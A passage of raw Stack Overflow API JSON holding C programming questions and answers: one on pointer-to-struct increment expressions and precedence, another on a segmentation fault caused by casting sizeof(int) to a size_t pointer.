"https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544634282, "post_id": 53747666, "comment_id": 94348333, "body": "@Jabberwocky - your example contains 3 memory locations.  The OP contains only one.  When memory is advanced for a second time, it points to a location not defined in the declaration. I have edited my post to clarify what I am trying to say..."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1544634434, "post_id": 53747666, "comment_id": 94348398, "body": "@ryyker hm, yes it points to a location not defined in the declaration, but as we don&#39;t dereference it, I&#39;m not sure it&#39;s UB. It&#39;s a corner case. Maybe it&#39;s worth a SO question on it&#39;s own."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544634690, "post_id": 53747666, "comment_id": 94348530, "body": "@Jabberwocky - if you ask it, please link your question here.  I would think accessing <i>and</i> printing a memory location that contains a value not bounded by the proper type (in this case <code>int</code>) using a format specifier <code>%d</code> is undefined behavior.  At the very least, the results cannot be determined before hand, as that location can be own possibly by another process, and change it at will."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1544634736, "post_id": 53747666, "comment_id": 94348555, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/185155/discussion-between-jabberwocky-and-ryyker\">continue this discussion in chat</a>."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 2, "creation_date": 1544636641, "post_id": 53747666, "comment_id": 94349672, "body": "For those interested in the question of <i>undefined behavior</i>, <i><a href=\"https://stackoverflow.com/questions/53748369/do-the-printf-statements-in-this-example-invoke-undefined-behavior#53748425\">here is a tertiary question</a></i> on the topic, specific to this one."}], "tags": [], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "is_accepted": false, "score": 1, "last_activity_date": 1544636990, "last_edit_date": 1544636990, "creation_date": 1544633203, "answer_id": 53747666, "question_id": 53747225, "link": "https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do/53747666#53747666", "title": "p is a pointer to a structure, what do all these code snippets do?", "body": "<p>See comments in-line:</p>\n\n<pre><code>struct my_structure {\n    int i;\n};\n\nvoid main() {\n    struct my_structure variable = {20};\n    struct my_structure *p = &amp;variable;\n\n    printf(\"NAME: %d\\n\", ++p-&gt;i);     //pre-increments i by 1 (prints 21)\n    printf(\"NUMBER: %d\\n\", (p++)-&gt;i);   //changes location pointed to. (meaningless, ub, printed 3 for me)\n    //printf(\"RANK: %d\", *p-&gt;i++);      // error, (will not be included in build)\n    //printf(\"name: %d\\n\", *p-&gt;i++);      // error, (will not be included in build)\n    //printf(\"number: %d\\n\", (*p-&gt;i)++);// error, (will not be included in build)\n    //printf(\"rank: %d\", *p++-&gt;i);    // error, (will not be included in build)\n\n    getchar();\n}\n</code></pre>\n\n<p>Although both the first and second statements are syntactically correct (i.e.  compile, build and run without any indication of problem) only the first makes sense, although for what purpose, I do not know.  Given the declaration: <code>struct my_structure variable = {20};</code>, only  defines a single memory location, the second increment of the pointer places its location beyond your definition, and pointing to an unknown value.  In my run, it pointed to a  <code>3</code>, but could have contained anything. And, since it was not owned, invokes <em><a href=\"https://www.geeksforgeeks.org/undefined-behavior-c-cpp/\" rel=\"nofollow noreferrer\">undefined behavior</a></em>. This is why it would be very likely that running the resultant executable, on different PCs, or even on the same PC at different times would produce varying results.   </p>\n"}, {"tags": [], "owner": {"reputation": 862, "user_id": 890897, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7846a21f6ef5adf0d5bd0375b04428e?s=128&d=identicon&r=PG", "display_name": "tdk001", "link": "https://stackoverflow.com/users/890897/tdk001"}, "is_accepted": false, "score": 1, "last_activity_date": 1544635849, "creation_date": 1544635849, "answer_id": 53748390, "question_id": 53747225, "link": "https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do/53748390#53748390", "title": "p is a pointer to a structure, what do all these code snippets do?", "body": "<p>Let's break this down by operator.</p>\n\n<p><code>x-&gt;y</code>: This dereferences a pointer to an struct (<code>x</code>) and then accesses the indicated member variable (<code>y</code>). It is only meaningful if <code>x</code> is a pointer to an struct. It is also equivalent to <code>(*x).y</code>.</p>\n\n<p><code>++x</code>: Pre-increments <code>x</code>. This increases the value of <code>x</code> by <code>1</code> then returns the NEW value of <code>x</code>. It is lower priority than the <code>-&gt;</code> operator, so <code>++p-&gt;i</code> will fetch <code>i</code> as above, then increment it.</p>\n\n<p><code>x++</code>: Post-increments <code>x</code>. This increases the value of <code>x</code> by <code>1</code> then returns the OLD value of <code>x</code>. But, this time, the operators are the same priority and get executed left to right. This will then increment <code>p</code> and then dereference where <code>p</code> used to be to access <code>i</code>. This will give you the value of <code>i</code>, but now <code>p</code> is pointing to uninitialized/unknown memory (unless <code>p</code> was in an array in which case it is now pointing to the next member of that array).</p>\n\n<p><code>*x</code>: Dereferences <code>x</code> just as I mentioned above under <code>-&gt;</code>, but in this example we are now doing it twice, resulting in the equivalent <code>((**p).i)++)</code>. However, since <code>p</code> is pointing to a struct and not pointing to a pointer to a struct, this is a compiler error. This goes for the next expression too as it just explicitly spells out the same order of operations that the compiler will already conform to.</p>\n\n<p>Putting that all together we come to the last one, which will in order:</p>\n\n<ol>\n<li>Dereference <code>p</code>. (so-far-so-good)</li>\n<li>Increment that result. But increment isn't defined for a struct, so compiler error.</li>\n<li>Dereference that result. Again, no longer a pointer, so we can't dereference. Compiler error.</li>\n<li>Access member <code>i</code> from that result.</li>\n</ol>\n\n<p>You can see the operator precedence rules I used here: <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">https://en.cppreference.com/w/c/language/operator_precedence</a></p>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 1, "last_activity_date": 1544650385, "last_edit_date": 1544650385, "creation_date": 1544636982, "answer_id": 53748668, "question_id": 53747225, "link": "https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do/53748668#53748668", "title": "p is a pointer to a structure, what do all these code snippets do?", "body": "<p>It's possible to make the code work (compile, run without crashing, and produce a coherent, explicable answer), but you need a different structure from the one chosen.  For example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct my_structure\n{\n    char *i;\n};\n\n#define EXPR(x) #x, x\n\nint main(void)\n{\n    char strings[][10] = { { \"Winter\" }, { \"Bash\" }, { \"Is\" }, { \"Here\" } };\n    struct my_structure variables[] = { { strings[0] }, { strings[1] }, { strings[2] }, { strings[3] } };\n    struct my_structure *p = variables;\n\n    printf(\"%10s: %s\\n\", EXPR(++p-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(p++-&gt;i));\n    printf(\"%10s: %d\\n\", EXPR(*p-&gt;i++));\n    printf(\"%10s: %d\\n\", EXPR(*p-&gt;i++));\n    printf(\"%10s: %d\\n\", EXPR((*p-&gt;i)++));\n    printf(\"%10s: %d\\n\", EXPR(*p++-&gt;i));\n    return 0;\n}\n</code></pre>\n\n<p>Which generates the output:</p>\n\n<pre><code>    ++p-&gt;i: inter\n    p++-&gt;i: inter\n   *p-&gt;i++: 66\n   *p-&gt;i++: 97\n (*p-&gt;i)++: 115\n   *p++-&gt;i: 116\n</code></pre>\n\n<p>The macro <code>EXPR</code> simply allows me not to repeat the expressions in the code, and yet to get both the string form and the value into the call to <code>printf()</code>.</p>\n\n<p>When things start out, <code>p-&gt;i</code> points to the string <code>\"Winter\"</code>.</p>\n\n<ul>\n<li><code>++p-&gt;i: inter</code> \u2014\u00a0pre-increments the pointer <code>p-&gt;i</code> so it points to the <code>i</code> of <code>Winter</code>.</li>\n<li><code>p++-&gt;i: inter</code> \u2014 post-increments the pointer <code>p</code> (to point to <code>\"Bash\"</code>), but the result is the same as before because the increment takes effect after <code>p-&gt;i</code> is used.</li>\n<li><code>*p-&gt;i++: 66</code> \u2014 post-increments the pointer <code>p-&gt;i</code> (so it points to the <code>a</code> in <code>Bash</code>) and reports the value pointed at before the increment, which is <code>B</code> (66 in ASCII).</li>\n<li><code>*p-&gt;i++: 97</code> \u2014 same expression, but the pointer points at <code>a</code> (97) before the increment and at the <code>s</code> after the increment.</li>\n<li><code>(*p-&gt;i)++: 115</code> \u2014\u00a0post-increments the letter that <code>p-&gt;i</code> points at, reporting <code>s</code> but changing it to <code>t</code>.</li>\n<li><code>*p++-&gt;i: 116</code> \u2014 post-increments <code>p</code> so it points to the string \"In\", while reporting <code>t</code> (116).</li>\n</ul>\n\n<p>Here's an alternative with more instrumentation:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct my_structure\n{\n    char *i;\n};\n\n#define EXPR(x) #x, x\n\nint main(void)\n{\n    char strings[][10] = { { \"Winter\" }, { \"Bash\" }, { \"Is\" }, { \"Here\" } };\n    struct my_structure variables[] = { { strings[0] }, { strings[1] }, { strings[2] }, { strings[3] } };\n    struct my_structure *p = variables;\n\n    for (size_t i = 0; i &lt; sizeof(strings)/sizeof(strings[0]); i++)\n        printf(\"strings[%zu] = [%s]\\n\", i, strings[i]);\n\n    for (size_t i = 0; i &lt; sizeof(variables)/sizeof(variables[0]); i++)\n        printf(\"variables[%zu].i = [%s]\\n\", i, variables[i].i);\n\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(++p-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(p++-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %d\\n\", EXPR(*p-&gt;i++));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %d\\n\", EXPR(*p-&gt;i++));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %d\\n\", EXPR((*p-&gt;i)++));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n    printf(\"%10s: %d\\n\", EXPR(*p++-&gt;i));\n    printf(\"%10s: %s\\n\", EXPR(p-&gt;i));\n\n    for (size_t i = 0; i &lt; sizeof(strings)/sizeof(strings[0]); i++)\n        printf(\"strings[%zu] = [%s]\\n\", i, strings[i]);\n\n    for (size_t i = 0; i &lt; sizeof(variables)/sizeof(variables[0]); i++)\n        printf(\"variables[%zu].i = [%s]\\n\", i, variables[i].i);\n\n    return 0;\n}\n</code></pre>\n\n<p>and its output:</p>\n\n<pre><code>strings[0] = [Winter]\nstrings[1] = [Bash]\nstrings[2] = [Is]\nstrings[3] = [Here]\nvariables[0].i = [Winter]\nvariables[1].i = [Bash]\nvariables[2].i = [Is]\nvariables[3].i = [Here]\n      p-&gt;i: Winter\n    ++p-&gt;i: inter\n      p-&gt;i: inter\n    p++-&gt;i: inter\n      p-&gt;i: Bash\n   *p-&gt;i++: 66\n      p-&gt;i: ash\n   *p-&gt;i++: 97\n      p-&gt;i: sh\n (*p-&gt;i)++: 115\n      p-&gt;i: th\n   *p++-&gt;i: 116\n      p-&gt;i: Is\nstrings[0] = [Winter]\nstrings[1] = [Bath]\nstrings[2] = [Is]\nstrings[3] = [Here]\nvariables[0].i = [inter]\nvariables[1].i = [th]\nvariables[2].i = [Is]\nvariables[3].i = [Here]\n</code></pre>\n\n<p>Play with variants of this scheme (extra parentheses, for example) to ensure you understand what's going on.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 2, "last_activity_date": 1544652404, "last_edit_date": 1544652404, "creation_date": 1544638214, "answer_id": 53748960, "question_id": 53747225, "link": "https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do/53748960#53748960", "title": "p is a pointer to a structure, what do all these code snippets do?", "body": "<p>First, some reminders:</p>\n\n<p><code>p++</code> evaluates to the current value of <code>p</code>, and as a <em>side effect</em> adds 1 to <code>p</code>.  If <code>p</code> is a pointer, it is set to point to the next object in a sequence.  </p>\n\n<p><code>++p</code> evaluates to the current value of <code>p + 1</code>, and as a side effect adds 1 to <code>p</code>.  Again, if <code>p</code> is a pointer, it is set to point to the next object in a sequence.  </p>\n\n<p>The postfix form of <code>++</code> and the <code>-&gt;</code> operator have the same precedence, and they have higher precedence than the unary (prefix) form of <code>++</code> and <code>*</code>.  Thus, an expression like <code>++p-&gt;i</code> is parsed as <code>++(p-&gt;i)</code>, <code>p-&gt;i++</code> is parsed as <code>(p-&gt;i)++</code>, <code>*p-&gt;i</code> is parsed as <code>*(p-&gt;i)</code>, etc.  </p>\n\n<p>With that out of the way...</p>\n\n<p>The expression</p>\n\n<pre><code>++p-&gt;i\n</code></pre>\n\n<p>is parsed as</p>\n\n<pre><code>++(p-&gt;i)\n</code></pre>\n\n<p>and evaluates to the current value of <code>p-&gt;i</code> plus 1, and as a <em>side effect</em> updates <code>p-&gt;i</code>.</p>\n\n<p>The expression</p>\n\n<pre><code>p++-&gt;i\n</code></pre>\n\n<p>is parsed as</p>\n\n<pre><code>(p++)-&gt;i\n</code></pre>\n\n<p>and evaluates to the current <code>p-&gt;i</code>, then updates <code>p</code> to point to the next <code>struct</code> object in a sequence.</p>\n\n<p>The expression</p>\n\n<pre><code>*p-&gt;i\n</code></pre>\n\n<p>is parsed as </p>\n\n<pre><code>*(p-&gt;i)\n</code></pre>\n\n<p>since <code>-&gt;</code> has higher precedence than unary <code>*</code>.  The operand of unary <code>*</code> must have a pointer type, but <code>p-&gt;i</code> is an integer, so the compiler will yak on this expression.</p>\n\n<p>The expression</p>\n\n<pre><code>*p-&gt;i++\n</code></pre>\n\n<p>is parsed as</p>\n\n<pre><code>*((p-&gt;i)++)\n</code></pre>\n\n<p>Again, the compiler will yak on this expression, since the operand of <code>*</code> is not a pointer type.</p>\n\n<p>The expression</p>\n\n<pre><code>(*p-&gt;i)++\n</code></pre>\n\n<p>is parsed as</p>\n\n<pre><code>(*(p-&gt;i))++\n</code></pre>\n\n<p>Again, <code>p-&gt;i</code> does not have pointer type, so the compiler will yak.</p>\n\n<p>The expression</p>\n\n<pre><code>*p++-&gt;i\n</code></pre>\n\n<p>is parsed as </p>\n\n<pre><code>*((p++)-&gt;i)\n</code></pre>\n\n<p>and, again, more yakkage.  </p>\n"}], "owner": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 1, "accepted_answer_id": 53748668, "answer_count": 4, "score": 1, "last_activity_date": 1544652404, "creation_date": 1544631659, "question_id": 53747225, "link": "https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do", "title": "p is a pointer to a structure, what do all these code snippets do?", "body": "<pre><code>++p-&gt;i \np++-&gt;i\n*p-&gt;i\n*p-&gt;i++\n(*p-&gt;i)++\n*p++-&gt;i\n</code></pre>\n\n<p>I don't understand these statements above, I wrote a small test program to understand them.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct my_structure {\n    int i;\n};\n\nvoid main() {\n    struct my_structure variable = {20};\n    struct my_structure *p = &amp;variable;\n\n    printf(\"NAME: %d\\n\", ++p-&gt;i);\n    printf(\"NUMBER: %d\\n\", p++-&gt;i);\n    printf(\"RANK: %d\", *p-&gt;i++);\n    printf(\"name: %d\\n\", *p-&gt;i++);\n    printf(\"number: %d\\n\", (*p-&gt;i)++);\n    printf(\"rank: %d\", *p++-&gt;i);\n}\n</code></pre>\n\n<p>Here's what the output I got after I commented the last four <code>print</code> statements:</p>\n\n<pre><code>NAME: 21\nNUMBER: 21\n</code></pre>\n\n<p>And after uncommenting the code and compiling I get:</p>\n\n<pre><code>test.c: In function 'main':\ntest.c:14:24: error: invalid type argument of unary '*' (have 'int')\nprintf(\"RANK: %d\", *p-&gt;i++);\n                    ^~~~~~~\ntest.c:15:26: error: invalid type argument of unary '*' (have 'int')\nprintf(\"name: %d\\n\", *p-&gt;i++);\n                      ^~~~~~~\ntest.c:16:29: error: invalid type argument of unary '*' (have 'int')\nprintf(\"number: %d\\n\", (*p-&gt;i)++);\n\n                         ^~~~~\ntest.c:17:24: error: invalid type argument of unary '*' (have 'int')\nprintf(\"rank: %d\", *p++-&gt;i);\n</code></pre>\n"}, {"tags": ["c", "casting"], "comments": [{"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 5, "creation_date": 1544631359, "post_id": 53747104, "comment_id": 94346734, "body": "Could you explain what you are attempting to do with <code>size_t *size = (size_t*)sizeof(int);</code>?"}, {"owner": {"reputation": 8027, "user_id": 3282436, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e17caa3e07899b69539433130de1d420?s=128&d=identicon&r=PG&f=1", "display_name": "0x5453", "link": "https://stackoverflow.com/users/3282436/0x5453"}, "edited": false, "score": 0, "creation_date": 1544631361, "post_id": 53747104, "comment_id": 94346738, "body": "Why is <code>size</code> a pointer to a <code>size_t</code>?"}, {"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1544631472, "post_id": 53747104, "comment_id": 94346799, "body": "Basic undefined behavior? dereferencing a random pointer."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1544631517, "post_id": 53747104, "comment_id": 94346830, "body": "Did you mean <code>size_t size = sizeof(int)</code>?"}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1544631586, "post_id": 53747104, "comment_id": 94346870, "body": "Sounds like you could use a <a href=\"http://stackoverflow.com/questions/388242/the-definitive-c-book-guide-and-list\">good C++ book</a>"}, {"owner": {"reputation": 51325, "user_id": 474349, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/ZMmIm.png?s=128&g=1", "display_name": "Hong Ooi", "link": "https://stackoverflow.com/users/474349/hong-ooi"}, "edited": false, "score": 0, "creation_date": 1544631688, "post_id": 53747104, "comment_id": 94346929, "body": "This is C, not C++"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1544631831, "post_id": 53747104, "comment_id": 94347012, "body": "<i>&quot;Could someone explain to me what is going on here&quot;</i> - yeah, the author has no idea what they&#39;re doing, and is relegated to cooking spaghetti (throw something at the wall and see if it sticks). Harsh reality, yes, but true regardless. A good book is on the menu. And fyi, if you removed <i>every</i> asterisk in this code (and with that, the cast against <code>sizeof(int)</code>) it would make considerably more sense."}, {"owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1544722030, "post_id": 53747104, "comment_id": 94386137, "body": "@Fran&#231;oisAndrieux I want to call a function <code>SetTagsize(size_t *size)</code>, which sets the size of a message that&#39;s being sent between threads. I&#39;m trying to set this message size equal to the size of an <code>int</code>, but the line <code>const uint32_t newSize = (uint32_t) * size;</code> within this function throws this error. The minimum example above is the furthest I could reduce it down. I know the problem lies in the pointer, but the function <code>SetTagsize(size_t *size)</code> is immutable, so I&#39;m stuck with that type."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 1, "creation_date": 1544722178, "post_id": 53747104, "comment_id": 94386203, "body": "@MitchellFaas The function almost certainly wants a pointer to a <code>size_t</code> that contains the size. You would want to store the size in a <code>size_t</code> and give it&#39;s address to your function. For example : <code>size_t my_size = sizeof(int); SetTagSize(&amp;my_size);</code>"}, {"owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1544722766, "post_id": 53747104, "comment_id": 94386463, "body": "@WhozCraig Instead of chastising based on limited information and uninformed assumptions, you could perhaps opt to contribute something productive or nothing at all? If I knew what I was doing, I wouldn&#39;t have to ask any questions, so I&#39;ll grant you that point flat out. That said, I&#39;m aware that the pointers are creating the issue, but don&#39;t know how to fix the issue while retaining the pointer (which is exactly what I need). Sometimes when doing research you run in to issues which don&#39;t seem to make a lot of sense. Im under the impression that questions are asked when you&#39;re confused."}, {"owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1544723309, "post_id": 53747104, "comment_id": 94386703, "body": "@Fran&#231;oisAndrieux This makes a lot of sense; I can&#39;t believe we didn&#39;t think of that before... You&#39;re a life saver!"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1544734636, "post_id": 53747104, "comment_id": 94391699, "body": "@MitchellFaas If your content put in comment <i>after</i> mine describing the <code>SetTagSize(size_t *)</code> api were part of the actual question, things would have likely gone smoother. If it sounded terse, so be it, but knowing that key piece of information from the outset would have made your code hurdle crystal clear."}], "answers": [{"tags": [], "owner": {"reputation": 5162, "user_id": 2785528, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5fc85984f1234637fa4ec24d93ae51bc?s=128&d=identicon&r=PG&f=1", "display_name": "2785528", "link": "https://stackoverflow.com/users/2785528/2785528"}, "is_accepted": false, "score": 1, "last_activity_date": 1544704385, "last_edit_date": 1544704385, "creation_date": 1544635716, "answer_id": 53748351, "question_id": 53747104, "link": "https://stackoverflow.com/questions/53747104/read-access-violation-when-calling-size-t-size-as-z/53748351#53748351", "title": "Read access violation when calling size_t *size as *z", "body": "<blockquote>\n  <p>what is going on here other than \"Read access violation error\"?</p>\n</blockquote>\n\n<p>my guess :</p>\n\n<pre><code>size_t *size = (size_t*)sizeof(int);\n                        ^^^^^^ 1\n                        ------^^^^^ 2\n               ^^^^^^^^^ 3\n\n// 1) sizeof() returns byte count in an unsigned integral type\n// 2) sizeof(int) is 4 or 8 depending on compiler and target system\n\n// For diagnostic, I added: \nfprintf(stdout, \"\\n  lu int size: %lu\\n\", sizeof(int)); \n// on my lubuntu 18.04 desktop, this line reports: \"  lu int size: 4\"\n\n// 3) (size_t*) is a c-style cast of the value of sizeof(int)\n// fprintf(stdout, \"\\n  size is: %zu\\n\", *size);\n\n// g++ reports format \u2018%zu\u2019 expects argument of type \u2018size_t\u2019\n// \n// Running your printf on my lubuntu gives a \"3403 Segmentation fault\"\n// with core dump.\n</code></pre>\n\n<hr>\n\n<p>Summary: I think \"what is going on\" is that you are attempting to access \naddress 0x00000008 in your system, which is apparently not allowed.  </p>\n\n<p>Does your system (compiler / os / hw) allow access to address 0x00000008 ?  Many embedded systems do not.</p>\n\n<p>Is this really something you want to do? (i.e. read an int from an address (maybe 0x00000008) derived from the sizeof an int)</p>\n\n<hr>\n\n<p>Experiment:</p>\n\n<p>You might try to read that address using some other technique ...  int? byte? char? access</p>\n\n<hr>\n\n<p>Possible root cause:  </p>\n\n<p>Perhaps your OS requires special privileges for the accessing processes / task.</p>\n\n<p>Perhaps your HW has no memory at that location </p>\n"}], "owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1544704385, "creation_date": 1544631242, "last_edit_date": 1544631704, "question_id": 53747104, "link": "https://stackoverflow.com/questions/53747104/read-access-violation-when-calling-size-t-size-as-z", "title": "Read access violation when calling size_t *size as *z", "body": "<p>Usually, I write a long piece of text, but this problem is rather simple. I'm currently working on some Python C API stuff, and need to parse a python integer to a <code>size_t*</code> type. If no integer is given, I want the size to default to <code>sizeof(int)</code> but get an error. The following minimal example shows my issue:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    size_t *size = (size_t*)sizeof(int);\n    fprintf(stdout, \"size is: %zu\\n\", *size);\n}\n</code></pre>\n\n<p>Could someone explain to me what is going on here other than \"Read access violation error\"?</p>\n"}, {"tags": ["c", "android-ndk"], "comments": [{"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544784732, "post_id": 53746788, "comment_id": 94407704, "body": "Looks almost duplicate: <a href=\"https://stackoverflow.com/a/23365743/192373\">stackoverflow.com/a/23365743/192373</a>"}], "answers": [{"comments": [{"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", 